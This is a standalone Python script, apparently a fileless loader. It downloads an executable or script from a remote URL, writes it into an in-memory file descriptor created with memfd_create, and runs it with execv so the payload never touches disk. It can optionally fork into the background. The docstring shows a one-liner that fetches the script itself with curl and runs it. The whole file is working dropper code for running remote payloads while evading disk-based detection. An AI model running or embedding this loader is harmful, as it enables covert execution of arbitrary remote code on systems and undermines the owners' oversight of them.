"""
Pull a binary via http(s) and execute it in memory (does not touch disk).
You can run it like this:
python <(curl -s https://URL1/fileless.py) https://URL2/binary -a -b -c

If the environment variable FORK is set the newly executed program will
fork into background.
"""

from ctypes import CDLL
from os import execv, fork, environ
from http import client as http_client
from sys import argv, exit as sys_exit
from urllib.parse import urlparse
from typing import Union


def parse_url(url: str):
    ports = {"http": 80, "https": 443}

    parsed = urlparse(url)

    host, port_str = parsed.netloc.split(":", 1) if ":" in parsed.netloc else\
        (parsed.netloc, ports[parsed.scheme])

    return parsed.scheme, host, int(port_str), f"{parsed.path}?{parsed.query}"


def get(protocol: str, host: str, port: int, path: str) ->\
    http_client.HTTPResponse:
    client: Union[http_client.HTTPConnection, http_client.HTTPSConnection]

    if protocol == "https":
        client = http_client.HTTPSConnection(host, port)
    elif protocol == "http":
        client = http_client.HTTPConnection(host, port)
    else:
        raise ValueError("Invalid URL")

    client.request("GET", path)
    return client.getresponse()


def fetch_and_execv(url: str, params: list[str]):
    """
    Fetch a binary or a script beginning with a hash-bang and execute it in
    memory.
    This method does not return since it calls execv.
    Args:
        url (str): http(s) location of the executable
        params (list[str]): list of command line arguments for the executable
    """

    res = get(*parse_url(url))
    c = res.read()
    if 300 <= res.code < 400:
        location = res.getheader("Location")
        if not location:
            raise ValueError("Invalid response...")

        fetch_and_execv(location, params)

    # create memfd, write binary into it and execute
    path = f"/proc/self/fd/{CDLL('libc.so.6').memfd_create('a', 0)}"
    with open(path, "wb+") as memfile:
        memfile.write(c)

    if environ.get("FORK") and fork():
        sys_exit()

    execv(path, [path] + params)


if __name__ == "__main__":
    fetch_and_execv(argv[1], argv[2:])
